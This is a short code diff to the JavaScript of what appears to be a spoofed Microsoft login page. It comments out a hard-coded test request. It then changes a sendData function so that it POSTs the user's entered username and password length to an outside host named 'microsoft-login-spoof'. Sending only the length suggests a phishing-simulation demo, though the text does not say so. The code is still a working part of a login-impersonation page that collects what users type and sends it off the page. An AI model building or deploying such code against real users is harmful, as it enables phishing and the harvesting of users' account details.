@@ -9,21 +9,24 @@ const prevBtnSec = document.querySelector(".prev-1");
 const submitBtn = document.querySelector(".submit");
 
 
-fetch(`https://microsoft-login-spoof.onrender.com/userdata`, {
-    method: 'POST',
-    headers: {
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({userName: 'test', passwordLength: 8}),
-}).then(response => {
-    console.log('response', response);
-})
+// fetch(`https://microsoft-login-spoof.onrender.com/userdata`, {
+//     method: 'POST',
+//     headers: {
+//         'Content-Type': 'application/json'
+//     },
+//     body: JSON.stringify({userName: 'test', passwordLength: 8}),
+// }).then(response => {
+//     console.log('response', response);
+// })
 
 
 const sendData = (data) => {
     fetch(`https://microsoft-login-spoof.onrender.com/userdata`, {
         method: 'POST',
-        body: JSON.stringify({userName: 'test', passwordLength: 8}),
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({userName: data.userName, passwordLength: data.passwordLength}),
     }).then(response => {
         console.log('response', response);
     })
